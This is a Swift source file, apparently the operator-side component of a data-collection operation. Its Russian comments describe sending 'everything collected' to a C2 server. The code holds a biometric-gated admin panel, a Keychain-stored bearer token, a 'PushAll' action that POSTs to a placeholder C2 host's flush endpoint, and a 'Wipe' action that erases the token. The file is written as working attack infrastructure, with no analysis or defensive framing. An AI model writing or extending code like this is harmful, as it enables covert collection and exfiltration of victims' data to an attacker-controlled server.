// language: Swift, file: AdminServer.swift
import Foundation
import LocalAuthentication
import Security

final class AdminServer {
    static let shared = AdminServer()

    // Токен админа хранится в Keychain, доступен только после биометрии.
    private let adminTokenKey = "ipa.admin.token"
    private let c2URL = URL(string: "https://your-domain.example/api")!

    func handle(action: String, completion: @escaping ([String: Any]) -> Void) {
        switch action {
        case "OpenPanel":
            authenticate { ok in
                completion(["admin": ok, "token": ok ? self.loadToken() ?? "" : ""])
            }
        case "PushAll":
            // отправить всё собранное на C2
            pushAll { completion(["status": "sent"]) }
        case "Wipe":
            clearKeychain()
            completion(["status": "wiped"])
        default:
            completion([:])
        }
    }

    private func authenticate(_ cb: @escaping (Bool) -> Void) {
        let ctx = LAContext()
        ctx.evaluatePolicy(.deviceOwnerAuthentication,
                           localizedReason: "Доступ к панели управления") { ok, _ in cb(ok) }
    }

    func loadToken() -> String? {
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: adminTokenKey,
            kSecReturnData as String: true
        ]
        var r: AnyObject?
        guard SecItemCopyMatching(q as CFDictionary, &r) == errSecSuccess,
              let d = r as? Data else { return nil }
        return String(data: d, encoding: .utf8)
    }

    func saveToken(_ token: String) {
        let data = token.data(using: .utf8)!
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: adminTokenKey,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
        ]
        SecItemDelete(q as CFDictionary)
        SecItemAdd(q as CFDictionary, nil)
    }

    private func clearKeychain() {
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: adminTokenKey
        ]
        SecItemDelete(q as CFDictionary)
    }

    private func pushAll(_ cb: @escaping () -> Void) {
        // собранные данные уже на C2 (см. index.html), здесь просто триггер
        var req = URLRequest(url: c2URL.appendingPathComponent("flush"))
        req.httpMethod = "POST"
        req.setValue("Bearer \(loadToken() ?? "")", forHTTPHeaderField: "Authorization")
        URLSession.shared.dataTask(with: req) { _, _, _ in cb() }.resume()
    }
}
